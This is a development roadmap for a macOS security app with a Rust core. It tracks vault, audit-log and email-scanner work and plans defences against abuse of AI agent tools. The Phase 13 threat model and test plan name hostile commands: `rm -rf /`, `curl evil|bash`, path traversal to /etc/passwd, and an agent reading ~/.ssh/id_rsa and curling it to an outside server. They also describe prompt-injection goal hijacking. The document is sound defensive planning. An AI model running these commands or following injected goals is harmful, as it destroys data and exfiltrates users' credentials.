Separate "what to watch" from "what to decrypt." Stores paths + protection levels only — no secrets.

| Component | Status | Location |
|-----------|--------|----------|
| `VaultTrackingManifest` struct (Codable: path, watchPath, protection, addedAt) | ✅ Done | New: `Vault/VaultTrackingManifest.swift` |
| `VaultTrackingStore` singleton (load/save/add/remove/update, serial queue, atomic write) | ✅ Done | `Vault/VaultTrackingManifest.swift` |
| File: `~/.mac-security/vault-tracking-manifest.json` (permissions 0600) | ✅ Done | `VaultTrackingManifest.swift` |

#### Step 3: Always-On Tracker Auto-Load

| Component | Status | Location |
|-----------|--------|----------|
| `VaultFileTracker.init()` reads sidecar, calls `track()` for each entry (no passphrase) | ✅ Done | `Vault/VaultFileTracker.swift` |
| `SecurityDaemon.start()` triggers auto-load immediately after tracker creation | ✅ Done | `Core/SecurityDaemon.swift` |
| Log: "Vault tracker auto-loaded N files from sidecar" | ✅ Done | `VaultFileTracker.swift` |

#### Step 4: Keep Sidecar in Sync with Vault Operations

| Component | Status | Location |
|-----------|--------|----------|
| `VaultManager.addFiles` success → `VaultTrackingStore.addEntries()` | ✅ Done | `Vault/VaultManager.swift` |
| `VaultManager.removeFiles` success → `VaultTrackingStore.removeEntries()` | ✅ Done | `Vault/VaultManager.swift` |
| `VaultManager.lockFiles` / `unlockFiles` → update sidecar watchPath | ✅ Done | `Vault/VaultManager.swift` |
| `VaultManager.syncTracker` → reconcile sidecar from encrypted manifest (source of truth) | ✅ Done | `Vault/VaultManager.swift` |

#### Step 5: Instrument All Operations with Audit Logging

| Component | Status | Location |
|-----------|--------|----------|
| `VaultManager.addFiles` → `VaultAuditLog.log(.fileAdded, ...)` | ✅ Done | `Vault/VaultManager.swift` |
| `VaultManager.removeFiles` → `VaultAuditLog.log(.fileRemoved, ...)` | ✅ Done | `Vault/VaultManager.swift` |
| `VaultManager.unlockFiles` → `VaultAuditLog.log(.fileUnlocked, ...)` | ✅ Done | `Vault/VaultManager.swift` |
| `VaultManager.lockFiles` → `VaultAuditLog.log(.fileLocked, ...)` | ✅ Done | `Vault/VaultManager.swift` |
| `VaultManager.changePassphrase` → `VaultAuditLog.log(.passphraseChanged, ...)` | ✅ Done | `Vault/VaultManager.swift` |
| `VaultFileTracker.handleFileMoved` → `VaultAuditLog.log(.fileMoved, ...)` | ✅ Done | `Vault/VaultFileTracker.swift` |
| `VaultFileTracker.handleFileEvent` (modification) → `VaultAuditLog.log(.fileModified, ...)` | ✅ Done | `Vault/VaultFileTracker.swift` |
| Email/Message scanner threats → `VaultAuditLog.log(.threatDetected, ...)` | ✅ Done | `Modules/EmailScanner.swift`, `Modules/MessagesScanner.swift` |

#### Step 6: Rust — `update_entry_path()` for File Move Persistence

| Component | Status | Location |
|-----------|--------|----------|
| `Vault::update_entry_path(old_path, new_path, passphrase)` in Rust | ✅ Done | `SecurityCore/crates/security-core/src/vault.rs` |
| Load manifest, find entry by old_path, update original_path + vault_path | ✅ Done | `vault.rs` |
| If locked: `fs::rename` the `.vault` file to new location | ✅ Done | `vault.rs` |
| Rust unit tests for path update (normal move, locked file move) | ✅ Done | `vault.rs` |

#### Step 7: FFI + Swift Bridge for Path Update

| Component | Status | Location |
|-----------|--------|----------|
| `sec_vault_update_path()` FFI export (security_dir, old, new, passphrase) | ✅ Done | `SecurityCore/crates/security-core-ffi/src/lib.rs` |
| C header declaration | ✅ Done | `CSecurityCore/include/security_core.h` |
| `SecurityCoreBridge.vaultUpdatePath()` Swift wrapper | ✅ Done | `RustBridge/SecurityCoreBridge.swift` |

#### Step 8: File Move Tracking Persists to Manifest + Sidecar

| Component | Status | Location |
|-----------|--------|----------|
| `VaultFileTracker.updateTrackedPath()` — updates sidecar immediately (no passphrase) | ✅ Done | `Vault/VaultFileTracker.swift` |
| If passphrase available: call `SecurityCoreBridge.vaultUpdatePath()` | ✅ Done | `VaultFileTracker.swift` |
| If passphrase unavailable: queue in `pendingMoves` array | ✅ Done | `VaultFileTracker.swift` |
| Re-key `trackedFiles` dictionary, recreate DispatchSource + bookmark for new path | ✅ Done | `VaultFileTracker.swift` |
| `handleFileMoved()` calls `updateTrackedPath()` for all move types | ✅ Done | `VaultFileTracker.swift` |
| Persist pending ops to `~/.mac-security/vault-pending-ops.json` for crash recovery | ✅ Done | `VaultFileTracker.swift` |

#### Step 9: Background Cleanup for Deleted Files

| Component | Status | Location |
|-----------|--------|----------|
| 60-second cleanup timer on serial queue (`checkTrackedFilesExist()`) | ✅ Done | `Vault/VaultFileTracker.swift` |
| Check each tracked file exists; try bookmark if missing; add to `pendingDeletions` if gone | ✅ Done | `VaultFileTracker.swift` |
| `processDeletions()` — remove from sidecar, manifest (if passphrase), and tracker dict | ✅ Done | `VaultFileTracker.swift` |
| `VaultManager.syncTracker()` — process pending moves + deletions on auth | ✅ Done | `Vault/VaultManager.swift` |
| Keep existing `cleanupDeletedEntries()` in VaultWindowView as fallback | ✅ Done | `Vault/VaultWindowView.swift` |

#### Step 10: Email Scanner — FDA Diagnostics + Error Visibility

| Component | Status | Location |
|-----------|--------|----------|
| Replace `try?` with `try/catch` in `findEmlxFiles()` — log exact directory that fails | ✅ Done | `Modules/EmailScanner.swift` |
| `checkMailAccess()` diagnostic at startup (canOpen, canTraverse, emlxCount) | ✅ Done | `EmailScanner.swift` |
| Try versioned Mail paths (`V9/`, `V10/`, `V11/`) if top-level yields 0 files | ✅ Done | `EmailScanner.swift` |
| Expose `@Published scannerStatus` and `fdaRequired` flag | ✅ Done | `EmailScanner.swift` |
| Log on EVERY poll attempt (not just when threats found) | ✅ Done | `EmailScanner.swift` |

#### Step 11: Email Scanner Status in UI

| Component | Status | Location |
|-----------|--------|----------|
| `SecurityDaemon` — delayed 5s startup check, set `emailScannerStatus` published property | ✅ Done | `Core/SecurityDaemon.swift` |
| Menu bar — show "Email: Active (N scanned)" or "Email: FDA Required" | ✅ Done | `AISecurityApp.swift` |
| "FDA Required" links to System Settings > Privacy & Security > Full Disk Access | ✅ Done | `AISecurityApp.swift` |

#### Step 12: Rust — `add_with_progress()` with Cancel Callback

| Component | Status | Location |
|-----------|--------|----------|
| `Vault::add_with_progress(paths, protection, passphrase, callback)` | ✅ Done | `SecurityCore/crates/security-core/src/vault.rs` |
| Callback: `Fn(u32, u32, &str) -> bool` (current, total, path → should_continue) | ✅ Done | `vault.rs` |
| If callback returns false: save partial manifest, return with `entries_affected` count | ✅ Done | `vault.rs` |
| Existing `add()` delegates to `add_with_progress` with `\|_,_,_\| true` | ✅ Done | `vault.rs` |
| `sec_vault_add_with_progress()` FFI with C function pointer | ✅ Done | `security-core-ffi/src/lib.rs` |
| C header + `SecurityCoreBridge.vaultAddWithProgress()` Swift wrapper | ✅ Done | `security_core.h`, `SecurityCoreBridge.swift` |

#### Step 13: Batch Protection — Progress Window + Improved Confirmation

| Component | Status | Location |
|-----------|--------|----------|
| `VaultProgressWindow` — NSPanel with progress bar, file label, count, Cancel button | ✅ Done | New: `Vault/VaultProgressWindow.swift` |
| Atomic `cancelled` flag checked by C callback from Rust | ✅ Done | `VaultProgressWindow.swift` |
| Callback updates UI via `DispatchQueue.main.async` | ✅ Done | `VaultProgressWindow.swift` |
| Improved `confirmEncrypt()` — bold file count, scrollable list, warning for >50 files | ✅ Done | `Vault/VaultDialogs.swift` |

#### Step 14: Async Batch Flow Wired Up

| Component | Status | Location |
|-----------|--------|----------|
| After confirmation: show `VaultProgressWindow`, dispatch to background | ✅ Done | `AISecurityApp.swift` |
| Background calls `vaultAddWithProgress` with C callback | ✅ Done | `AISecurityApp.swift` |
| On completion/cancel: dismiss window, show summary ("Protected N of M") | ✅ Done | `AISecurityApp.swift` |
| Update tracking sidecar for all successfully protected files | ✅ Done | `AISecurityApp.swift`, `VaultManager.swift` |

#### Step 15: Audit Log Viewer in Vault Window

| Component | Status | Location |
|-----------|--------|----------|
| "View Audit Log" button in vault window action bar | ✅ Done | `Vault/VaultWindowView.swift` |
| Sheet with scrollable list of recent entries (last 500) | ✅ Done | `VaultWindowView.swift` |
| Filter by event type dropdown | ✅ Done | `VaultWindowView.swift` |

#### Step 16: Atomic `change_protection()` (from original Phase 11b)

| Component | Status | Location |
|-----------|--------|----------|
| `Vault::change_protection(paths, new_protection, passphrase)` in Rust | ✅ Done | `vault.rs` |
| Handle all 20 transitions atomically (single manifest load/save) | ✅ Done | `vault.rs` |
| Fast path: Locked↔LockedLocal, ReadOnly↔ReadOnlyLocal (metadata only) | ✅ Done | `vault.rs` |
| Decrypt→re-encrypt transitions (Locked→ReadOnly, etc.) | ✅ Done | `vault.rs` |
| Encrypt transitions (ReadOnly→Locked, LocalOnly→Locked) | ✅ Done | `vault.rs` |
| Rust unit tests for key transitions | ✅ Done | `vault.rs` |
| `sec_vault_change_protection()` FFI export | ✅ Done | `security-core-ffi/src/lib.rs` |
| C header + `SecurityCoreBridge.vaultChangeProtection()` wrapper | ✅ Done | `security_core.h`, `SecurityCoreBridge.swift` |
| `VaultManager.changeProtection()` convenience method | ✅ Done | `VaultManager.swift` |
| Replace remove+add in VaultWindowView with single atomic call | ✅ Done | `VaultWindowView.swift` |
| Update Finder tags + deletion protection after change | ✅ Done | `VaultWindowView.swift` |
| Update sidecar after protection change | ✅ Done | `VaultManager.swift` |

#### Step 17: Sidecar ↔ Encrypted Manifest Reconciliation

| Component | Status | Location |
|-----------|--------|----------|
| On auth: compare sidecar entries vs encrypted manifest entries | ✅ Done | `Vault/VaultManager.swift` |
| If sidecar has entries not in manifest: remove from sidecar | ✅ Done | `VaultManager.swift` |
| If manifest has entries not in sidecar: add to sidecar | ✅ Done | `VaultManager.swift` |
| Log any discrepancies to audit log | ✅ Done | `VaultManager.swift` |

#### Transition Matrix (for Step 16)

All 20 protection transitions and their file operations:

```
From \ To        | Locked           | ReadOnly         | LocalOnly   | RO+Local         | Locked+Local
─────────────────|──────────────────|──────────────────|─────────────|──────────────────|──────────────
Locked           | -                | Decrypt, chmod444| Decrypt     | Decrypt, chmod444| Metadata only
ReadOnly         | chmod644, Encrypt| -                | chmod644    | Metadata only    | chmod644, Encrypt
LocalOnly        | Encrypt          | chmod444         | -           | chmod444         | Encrypt
ReadOnly+Local   | chmod644, Encrypt| Metadata only    | chmod644    | -                | chmod644, Encrypt
Locked+Local     | Metadata only    | Decrypt, chmod444| Decrypt     | Decrypt, chmod444| -
```

#### New Files Created in Phase 11b

| File | Purpose |
|------|---------|
| `Sources/AISecurity/Vault/VaultAuditLog.swift` | Structured audit trail with 30-day rotation |
| `Sources/AISecurity/Vault/VaultTrackingManifest.swift` | Unencrypted sidecar for always-on tracking |
| `Sources/AISecurity/Vault/VaultProgressWindow.swift` | Batch progress UI with cancel button |

#### Existing Files Modified in Phase 11b

| File | Changes |
|------|---------|
| `SecurityCore/crates/security-core/src/vault.rs` | `update_entry_path()`, `add_with_progress()`, `change_protection()` |
| `SecurityCore/crates/security-core-ffi/src/lib.rs` | 3 new FFI exports |
| `CSecurityCore/include/security_core.h` | 3 new C declarations |
| `Sources/AISecurity/RustBridge/SecurityCoreBridge.swift` | 3 new bridge methods |
| `Sources/AISecurity/Vault/VaultFileTracker.swift` | Auto-load, move persistence, cleanup timer, pending ops |
| `Sources/AISecurity/Vault/VaultManager.swift` | Sidecar sync, pending ops on auth, reconciliation, audit hooks |
| `Sources/AISecurity/Vault/VaultWindowView.swift` | Audit log viewer button |
| `Sources/AISecurity/Vault/VaultDialogs.swift` | Improved batch confirmation |
| `Sources/AISecurity/Modules/EmailScanner.swift` | FDA diagnostics, proper error handling, status |
| `Sources/AISecurity/Modules/MessagesScanner.swift` | Audit logging for threats |
| `Sources/AISecurity/Core/SecurityDaemon.swift` | Tracker auto-start, email status check |
| `Sources/AISecurity/AISecurityApp.swift` | Async batch flow, email status in menu |

#### Verification

| Test | Expected Result |
|------|----------------|
| Kill app, restart | Tracker auto-loads all vault files within 5s (check log) |
| Protect file → move in Finder | Vault UI shows new path, audit log shows FILE_MOVED |
| Protect file → Trash → Empty Trash | Entry auto-removed from vault within 60s |
| Select 100+ files → start → Cancel at 50% | Partial success reported, uncancelled files unprotected |
| Select folder with many files | Prominent count in confirmation dialog |
| Check menu bar Email section | "Email: Active (N scanned)" or "Email: FDA Required" |
| Revoke FDA → check menu | "Email: FDA Required" appears |
| Perform add/move/delete/unlock | All events in audit log with timestamps |
| Wait 30+ days | Old audit logs auto-deleted on startup |
| Manually edit sidecar → auth to vault | Sidecar corrected to match encrypted manifest |
| Change protection level on existing file | Single atomic operation, correct badges, sidecar updated |

### Phase 12: Commercial Release Path

| Component | Status | Notes |
|-----------|--------|-------|
| **Distribution** | | |
| App notarization (notarytool) | ⬜ Not started | Submit .dmg to Apple for malware scan |
| .dmg installer creation | ⬜ Not started | Package .app into installable .dmg |
| GitHub Releases hosting | ⬜ Not started | Upload .dmg for public download |
| **Endpoint Security Framework** | | |
| Request ES entitlement from Apple | ⬜ Not started | Email Apple with security tool use case |
| Migrate FileWatcher to ES framework | ⬜ Not started | Per-process file access monitoring |
| Vault access blocking (AUTH events) | ⬜ Not started | Block unauthorized vault file access in real-time |
| **Auto-Update** | | |
| Sparkle SPM integration | ⬜ Not started | Auto-update framework for non-App-Store apps |
| Appcast XML + EdDSA signing | ⬜ Not started | Host update feed, sign releases |
| **Onboarding** | | |
| First-run welcome wizard | ⬜ Not started | Permissions guide + feature overview |
| **Legal & Business** | | |
| Privacy policy + terms of service | ⬜ Not started | Required for public distribution |
| Business model decision | ⬜ Not started | Open source + premium vs direct sale |
| Landing page / marketing site | ⬜ Not started | — |

### Phase 13: AI Agent Threat Defense — Command Interception & Policy Engine

**Motivation:** Research into Claudian (Obsidian AI plugin), Sage (Gen Digital), NVIDIA OpenShell,
LlamaFirewall (Meta), and Microsoft Agent Governance Toolkit reveals that the primary attack surface
for AI agents is tool execution — bash commands, file operations, and network requests. AISecurity
already has strong file protection (vault) and content scanning (email, messages, clipboard), but
lacks a systematic defense against agent-initiated tool abuse.

**Research sources:**
- Claudian (`github.com/YishenTu/claudian`) — bash prefix matching, path boundary checks, tiered permissions
- Sage (Gen Digital) — YAML-based threat definitions, supply-chain checking, hook-based interception
- NVIDIA OpenShell — declarative YAML policies, filesystem + network sandboxing, hot-reloadable rules
- LlamaFirewall (Meta) — chain-of-thought auditing, reduced attack success 17.6% → 1.75%
- Microsoft Agent Governance Toolkit — sub-ms policy engine, Ed25519 plugin signing, OWASP Agentic Top 10
- "Your AI, My Shell" (arXiv 2509.22040) — 84% attack success rate on coding editors via prompt injection
- Trail of Bits — demonstrated prompt-injection-to-RCE chains in real AI agent systems

| Component | Status | Notes |
|-----------|--------|-------|
| **Bash Command Policy Engine** | | |
| YAML policy file for allowed/blocked command patterns | ⬜ Not started | `~/.mac-security/command-policy.yaml` — hot-reloadable |
| Word-boundary prefix matching (Claudian pattern) | ⬜ Not started | `git:*` matches `git status` but NOT `github-cli` |
| Command AST parsing for chained commands | ⬜ Not started | Detect `cmd1 && malicious_cmd`, pipes, subshells, variable expansion |
| Blocked command patterns (rm -rf, curl\|bash, etc.) | ⬜ Not started | Default blocklist + user-configurable allowlist |
| **File Access Policy** | | |
| Path prefix matching with directory boundary safety | ⬜ Not started | `/project` matches `/project/src` but NOT `/project-evil` |
| Symlink-safe validation (realpath before prefix check) | ✅ Done | Already in vault.rs `canonicalize()` — extend to policy engine |
| Per-agent file access scoping | ⬜ Not started | Agent X can only access ~/project-a, Agent Y only ~/project-b |
| **Supply Chain Security** | | |
| Package reputation check (npm, PyPI, Homebrew) | ⬜ Not started | Check package age, download count, known malware lists before install |
| Ed25519 signing for MCP server verification | ⬜ Not started | Verify MCP server plugins aren't tampered (Microsoft AGT pattern) |
| **Network Egress Filtering** | | |
| Outbound connection monitoring via Network Extension | ⬜ Not started | Alert/block when agent processes connect to untrusted destinations |
| DNS-level filtering for known malicious domains | ⬜ Not started | Block C2 servers, data exfiltration endpoints |
| **Agent Chain-of-Thought Auditing** | | |
| Lightweight local classifier for goal hijacking detection | ⬜ Not started | LlamaFirewall-inspired — flag reasoning that diverges from user intent |
| Action sequence anomaly detection | ⬜ Not started | Alert on: read credentials → network request (exfiltration pattern) |
| **TCC Database Monitoring** | | |
| Watch for unauthorized permission grants | ⬜ Not started | Monitor `~/Library/Application Support/com.apple.TCC/TCC.db` changes |
| Alert on new FDA/Accessibility/Camera grants | ⬜ Not started | Detect agents granting themselves permissions |
| **macOS Sandbox Profiles** | | |
| sandbox-exec profiles for agent processes | ⬜ Not started | OS-level filesystem and network restrictions |
| Hardened Runtime enforcement for agent binaries | ⬜ Not started | Prevent code injection, DYLD_INSERT attacks |
| **Declarative Policy System** | | |
| YAML/JSON policy configuration (OpenShell pattern) | ⬜ Not started | Static (locked at startup) + dynamic (hot-reloadable) sections |
| Sub-millisecond policy evaluation (trie/prefix tree) | ⬜ Not started | Microsoft AGT benchmark: p99 < 0.1ms |
| Session-scoped vs persistent rule tiers | ⬜ Not started | Claudian pattern: allow-once vs allow-always |
| Policy audit log (all allow/deny decisions) | ⬜ Not started | Append-only, cryptographically signed |
| **Verification** | | |
| Bash command injection test suite | ⬜ Not started | Test chained commands, subshells, variable expansion bypass |
| Path traversal attack tests | ⬜ Not started | Symlinks, `../` sequences, similarly-named directories |
| Supply chain attack simulation | ⬜ Not started | Install known-bad package, verify block |
| Network exfiltration test | ⬜ Not started | Agent reads ~/.ssh/id_rsa then curls external server |

#### Threat Model: AI Agents on macOS (Extended)

| Threat | Attack Vector | Current Defense | Phase 13 Defense |
|--------|--------------|-----------------|------------------|
| **Command injection** | Agent executes `rm -rf /` or `curl evil\|bash` | None (no command monitoring) | Bash policy engine + AST parsing |
| **Prefix collision** | Rule allows `git:*`, agent runs `github-token-stealer` | None | Word-boundary prefix matching |
| **Path traversal** | Agent reads `/etc/passwd` via `../../` from allowed dir | Vault symlink check only | Path prefix + realpath + policy |
| **Supply chain** | Agent installs backdoored npm package | None | Package reputation checking |
| **Permission escalation** | Agent grants itself Accessibility access via TCC | None | TCC database monitoring |
| **Data exfiltration** | Agent reads credentials then makes network request | Local-only vault (manual) | Network egress filter + action sequence detection |
| **Goal hijacking** | Prompt injection changes agent's objective mid-task | Prompt injection guard (content) | Chain-of-thought auditing (behavior) |
| **Plugin tampering** | Malicious MCP server impersonates trusted one | None | Ed25519 plugin signing |

---

## 0b. Codebase Audit Results

### AISecurity (Swift) — 13 source files

```
Sources/AISecurity/
├���─ AISecurityApp.swift            Main entry — NSStatusBar menubar app
├── Core/
│   ├── SecurityDaemon.swift       Master orchestrator (start/stop, lifecycle)
│   ├── SecurityLogger.swift       JSON logging + macOS UNUserNotifications
│   ├── SenderWhitelist.swift      Trusted sender management + freemail blocklist
│   └── SeverityLevel.swift        Severity enum + SecurityAlert + AlertType
├── Config/
│   └── SecurityConfig.swift       Centralized config (ALL paths hardcoded here)
└── Modules/
    ├── SensitiveDataDetector.swift     40+ regex: PII, crypto keys, API secrets, protected paths
    ├��─ PromptInjectionGuard.swift      8 categories: system prompt manipulation → jailbreaks
    ├── ExternalFileSanitizer.swift     Malware: reverse shells, RCE, destructive cmds, quarantine
    ���── EmailScanner.swift              Apple Mail .emlx: 10 threat categories + intent scoring
    ├─��� MessagesScanner.swift           iMessage chat.db: 9 threat categories via SQLite3 C API
    ├── FileWatcher.swift               DispatchSource monitoring: Downloads/Desktop/Documents
    └── ThreatIntentParser.swift        7-layer scoring engine (reduces false positives)
```

### MacSec (JavaScript) — 10 source files

```
MacSec/
├── mac-security-agent.js          Main daemon (323 lines, inline orchestration)
├── modules/
│   ├── sensitive-data-detector.js     405 lines — matching patterns to AISecurity
│   ├── prompt-injection-guard.js      178 lines — 8 categories
│   ├── external-file-sanitizer.js     239 lines — malware detection + quarantine
│   ├── email-scanner.js               625 lines — .emlx + 10 categories + intent
│   ├── messages-scanner.js            538 lines — chat.db via sqlite3 CLI
│   ├── file-watcher.js                231 lines — fs.watch + protected paths
│   ├── threat-intent-parser.js        218 lines — 7-layer scoring (IDENTICAL algorithm)
│   └── security-logger.js             87 lines — JSON logs + osascript notifications
├── config/security.config.js          Configuration
└── menubar/mac-security-menubar.py    Python/rumps menu bar UI
```

### Feature Gap Matrix

| Feature | AISecurity (Swift) | MacSec (JS) |
|---------|:--:|:--:|
| SenderWhitelist (dedicated module) | ✅ | ❌ (hardcoded in EmailScanner) |
| SecurityDaemon (orchestrator class) | ✅ | ❌ (inline in main) |
| SeverityLevel (type-safe enums) | ✅ | ❌ (strings) |
| Clipboard monitoring | ✅ (SecurityDaemon lines 194-227) | ✅ (pbpaste loop) |
| Scheduled scans | �� (SecurityDaemon lines 152-161) | ✅ |
| SwiftUI threat viewer | ✅ | ❌ (Python/rumps) |
| Zero external dependencies | ✅ (native Swift) | ✅ (Node.js built-ins only) |

**Verdict:** AISecurity is the more complete codebase. MacSec's value = reference for Linux paths/services.

### Portability Issues Found (Exhaustive)

**30+ hardcoded macOS paths:**
- `~/Library/Mail` — Apple Mail (SecurityConfig.swift:142, EmailScanner.swift)
- `~/Library/Messages/chat.db` — iMessage (MessagesScanner.swift:26-27)
- `~/Library/Keychains` — macOS Keychain (SensitiveDataDetector.swift:228)
- `~/Library/Application Support/Sparrow|Bitwarden|Aura|Photos` (SensitiveDataDetector.swift:219-230)
- `~/Library/Safari`, `~/Library/Calendars`, `~/Library/Group Containers/group.com.apple.notes`
- `~/Pictures/Photos Library.photoslibrary`
- `~/Documents/Tax Returns`, `~/Documents/TurboTax`
- `~/.ssh`, `~/.gnupg`, `~/.bitcoin`, `~/.lnd`, `~/.sparrow`
- `/System/Applications/Mail.app` (AISecurityApp.swift:390-394)
- `/Applications/AISecurity.app` (install.sh:52-55)

**50+ macOS-specific API calls:**
- AppKit: NSApplication, NSStatusBar, NSStatusItem, NSMenu, NSMenuItem, NSWorkspace, NSPasteboard, NSImage, NSHostingController, NSWindow
- SwiftUI: ThreatsWindowView, LogWindowView, SeverityBadge
- UserNotifications: UNUserNotificationCenter, UNMutableNotificationContent
- DispatchSource.makeFileSystemObjectSource (FileWatcher, EmailScanner)
- SQLite3 C API (MessagesScanner — chat.db)
- CryptoKit SHA256 (ExternalFileSanitizer)
- NSRegularExpression (all modules — replaced by Rust `regex` crate in Phase 2)

**8+ Apple-specific services:**
- Apple Mail .emlx format, iMessage chat.db, Keychain, Photos.app, Calendar
- LaunchAgent/plist deployment, Full Disk Access entitlements, codesign

**0 hardcoded ports** — entirely file-based architecture.

---

## 0c. ElizaOS Rust Security Research

ElizaOS has 409 `.rs` files across 10 crates. Their Rust security is **narrower than expected**:

| What they have | Details |
|---|---|
| AES-256-GCM encryption | Settings/secrets encryption with AAD, SHA-256 key derivation, v1→v2 migration |
| Sensitive key filtering | Blocks keys/secrets/passwords/tokens from AI-visible settings |
| rustls TLS | Pure-Rust TLS — no OpenSSL CVE surface |
| WASM sandbox | wasmtime for plugin memory isolation |
| Process lifecycle | Win32 Job Objects for child process cleanup (Windows only) |
| Request cancellation | tokio CancellationToken for cooperative cancellation |

| What they DON'T have | Notes |
|---|---|
| Tauri desktop app | Listed in README but does NOT exist in codebase |
| OS-level sandboxing | No seccomp, namespaces, cgroups, AppArmor |
| Agent isolation | Agents share same runtime process |
| WebSocket auth | Localhost-only computeruse bridge, no auth |
| Capability-based permissions | Any plugin can call any action |

**Key takeaway:** ElizaOS's Rust security = crypto + key filtering + WASM isolation. We can match and exceed this.

---

## 1. Phase 1: Mac Portability (No Rust)

**Goal:** Eliminate all hardcoded paths. AISecurity runs on any Mac without code changes.

### 1.1 External TOML Configuration

Create `config.toml.example` in repo root:

```toml
[general]
mode = "PRODUCTION"  # PRODUCTION | TESTING | DEVELOPMENT

[paths]
security_dir = "~/.mac-security"
mail_dir = "~/Library/Mail"
messages_db = "~/Library/Messages/chat.db"
quarantine_dir = "~/.mac-security/quarantine"
log_dir = "~/.mac-security/logs"

[file_watcher]
enabled = true
monitored_directories = ["~/Downloads", "~/Desktop", "~/Documents"]
max_scan_size_bytes = 5242880
debounce_ms = 300

[email_scanner]
enabled = true
startup_scan_limit = 50

[messages_scanner]
enabled = true

[scheduled_scan]
enabled = true
interval_hours = 6
scan_directories = ["~/Downloads", "~/Desktop", "~/Documents"]

[notifications]
enabled = true
critical_only = true

[protected_paths]
# Override default protected path list (macOS defaults used if omitted)
# paths = ["~/.ssh", "~/.gnupg", "~/.bitcoin", ...]
```

### 1.2 PathResolver

New file: `Sources/AISecurity/Config/PathResolver.swift`

```
struct PathResolver {
    let home: String                           // FileManager.homeDirectoryForCurrentUser
    let securityDir: String                    // config or ~/.mac-security
    func resolve(_ path: String) -> String     // expand ~ to $HOME
    func mailDir() -> String                   // config or ~/Library/Mail
    func messagesDb() -> String                // config or ~/Library/Messages/chat.db
    func quarantineDir() -> String
    func logDir() -> String
    func protectedPaths() -> [String]          // config or macOS defaults
}
```

### 1.3 Env Var Convention

| Env Var | Overrides |
|---------|-----------|
| `MACSEC_MODE` | `[general].mode` |
| `MACSEC_SECURITY_DIR` | `[paths].security_dir` |
| `MACSEC_MAIL_DIR` | `[paths].mail_dir` |
| `MACSEC_MESSAGES_DB` | `[paths].messages_db` |
| `MACSEC_LOG_DIR` | `[paths].log_dir` |
| `MACSEC_QUARANTINE_DIR` | `[paths].quarantine_dir` |
| `MACSEC_SCAN_DIRS` | `[file_watcher].monitored_directories` (colon-separated) |

Priority: env var > config.toml > hardcoded defaults.

### 1.4 Files to Modify

| File | What changes |
|------|-------------|
| `SecurityConfig.swift` | Major refactor: read TOML, env vars, keep defaults as fallback |
| `SensitiveDataDetector.swift` | Extract protectedPaths (lines 213-237) to PathResolver |
| `EmailScanner.swift` | Use config for mail_dir instead of hardcoded ~/Library/Mail |
| `MessagesScanner.swift` | Use config for messages_db instead of hardcoded path |
| `SecurityLogger.swift` | Use config for log_dir |
| `ExternalFileSanitizer.swift` | Use config for quarantine_dir |
| `Package.swift` | Add TOMLKit dependency |
| `install.sh` | Parameterize /Applications path, generate default config.toml |

### 1.5 Verification

```bash
# 1. Build and run on a fresh macOS user account with default paths — should work identically
swift build && swift run AISecurity

# 2. Custom config: point mail_dir to test directory
echo '[paths]\nmail_dir = "/tmp/test-mail"' > ~/.mac-security/config.toml
swift run AISecurity  # should scan /tmp/test-mail instead

# 3. Env var overrides config
MACSEC_MAIL_DIR=/tmp/env-mail swift run AISecurity  # should use /tmp/env-mail

# 4. No config.toml — all defaults identical to current behavior
rm ~/.mac-security/config.toml
swift run AISecurity  # behavior unchanged
```

---

## 2. Phase 2: Rust Core Library

**Goal:** All platform-agnostic detection logic in Rust. Compiles as static lib with C ABI.

### 2.1 Workspace Structure

```
SecurityCore/
  Cargo.toml                         # workspace root
  crates/
    security-core/                   # main library (rlib)
      Cargo.toml
      src/
        lib.rs                       # public API
        config.rs                    # TOML config parser (same format as Phase 1)
        severity.rs                  # SeverityLevel enum (#[repr(C)])
        alert.rs                     # SecurityAlert, ThreatDetail, FindingDetail
        threat_intent_parser.rs      # 7-layer scoring — PORT FIRST (self-contained)
        sensitive_data.rs            # 40+ regex patterns
        prompt_injection.rs          # 8 categories + heuristics
        file_sanitizer.rs            # malware patterns (no I/O — content-only)
        email_patterns.rs            # 10 email threat pattern groups
        message_patterns.rs          # 9 message threat pattern groups
        sender_whitelist.rs          # whitelist logic + freemail blocklist + JSON persistence
        path_resolver.rs             # platform-aware defaults (cfg!(target_os))
    security-core-ffi/               # thin FFI wrapper (cdylib)
      Cargo.toml
      cbindgen.toml
      src/lib.rs                     # #[no_mangle] pub extern "C" fn exports
  tests/
    intent_parser_tests.rs
    sensitive_data_tests.rs
    prompt_injection_tests.rs
    file_sanitizer_tests.rs
    cross_validation.rs              # compare output against known-good results
```

### 2.2 Port Order (by dependency + value)

1. **severity.rs + alert.rs** — data types used by everything else
2. **threat_intent_parser.rs** — self-contained, validates the entire pipeline
3. **sensitive_data.rs** — largest pattern set, used by FileWatcher + clipboard
4. **prompt_injection.rs** — 8 groups, validates heuristic porting
5. **file_sanitizer.rs** — malware patterns only (I/O stays in platform shell)
6. **email_patterns.rs** — 10 threat groups (parsing stays in platform shell)
7. **message_patterns.rs** — 9 threat groups (SQLite stays in platform shell)
8. **sender_whitelist.rs** — policy logic + JSON persistence
9. **config.rs + path_resolver.rs** — shared config format
10. **FFI layer** — C ABI exports + cbindgen header generation

### 2.3 Key Design Rules

- **Pattern modules never perform I/O.** They take `&str` and return structured results.
- **All regex compiled once** via `once_cell::sync::Lazy` (mirrors Swift `init()` pattern).
- **JSON field names must match exactly** — existing log parsers/UIs depend on them.
- **Scoring thresholds must match exactly:**
  - 5+ layers → CRITICAL
  - 4 layers → HIGH
  - 3 layers → MEDIUM (isThreat = true)
  - 2 layers → LOW (isThreat = false)
  - SMS channel: 4+ layers → CRITICAL

### 2.4 FFI Exports

```rust
// Init
pub extern "C" fn sec_init(config_path: *const c_char) -> bool;

// Analysis
pub extern "C" fn sec_parse_intent(text: *const c_char, channel: u8) -> *mut IntentResultFFI;
pub extern "C" fn sec_scan_sensitive_data(text: *const c_char, source: *const c_char) -> *mut FindingsArrayFFI;
pub extern "C" fn sec_validate_prompt(text: *const c_char, source: *const c_char) -> *mut ValidationResultFFI;
pub extern "C" fn sec_sanitize_text(text: *const c_char) -> *mut SanitizationResultFFI;
pub extern "C" fn sec_scan_file_content(text: *const c_char) -> *mut ThreatsArrayFFI;
pub extern "C" fn sec_analyze_email(text: *const c_char) -> *mut ThreatsArrayFFI;
pub extern "C" fn sec_analyze_message(text: *const c_char) -> *mut ThreatsArrayFFI;

// Whitelist
pub extern "C" fn sec_whitelist_check(sender: *const c_char) -> *mut ScanPolicyFFI;
pub extern "C" fn sec_whitelist_add(sender: *const c_char, note: *const c_char) -> bool;

// Memory management (one per return type)
